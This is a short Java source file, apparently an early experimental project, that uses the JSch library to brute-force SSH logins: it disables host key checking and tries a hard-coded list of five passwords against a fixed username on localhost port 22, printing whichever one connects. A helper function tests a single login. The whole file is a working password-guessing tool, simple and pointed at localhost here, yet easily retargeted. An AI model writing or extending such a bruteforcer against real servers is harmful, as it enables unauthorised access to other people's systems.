package solirs.sshbrutewj;


import com.jcraft.jsch.*; //SSH library


public class Main
{
    public static void sshbrute() throws JSchException{

        //This is an experimental engine for the bruteforcer.

        String passes[] = {"helloworld", "test", "0000", "4444","P4ssw0rd"};

        int i;
        JSch jsch = new JSch(); //Initialize jsch and the config
        jsch.setConfig("StrictHostKeyChecking", "no"); //Disable StrictHostKeyChecking since it causes issues with the ssh connection.

        String user = "username";

        int port = 22;
        



        for (i = 0; i < passes.length ; i++){

            try{
                //Try to connect with the password, if it works exit and print the password.


                System.out.println("Trying "+ passes[i]);
                Session session=jsch.getSession(user, "localhost", port);

                session.setTimeout(100);
    
                session.setPassword(passes[i]);
                session.connect();
                System.out.println("CONNECTED " + "Password is " + passes[i]);
                System.exit(0);
                
            }catch(Exception e){
                //Continue if the password is wrong
                continue;
            }

        }

        }
    
    public static void sshc() throws JSchException{

        //This function is mainly used for testing single connections

        String user = "username";
        String pass = "Password";
        
    

        JSch jsch = new JSch();
        jsch.setConfig("StrictHostKeyChecking", "no");
        Session session=jsch.getSession(user, "localhost", 22);
        session.setPassword(pass);
        session.connect();
        System.out.println("Connected");

    }
    public static void main( String[] args )
    {
        //It all starts hre
        System.out.println("Starting...");

        try{
            sshbrute();

        } catch(Exception j){
            System.out.print(j);
        }



    }
}
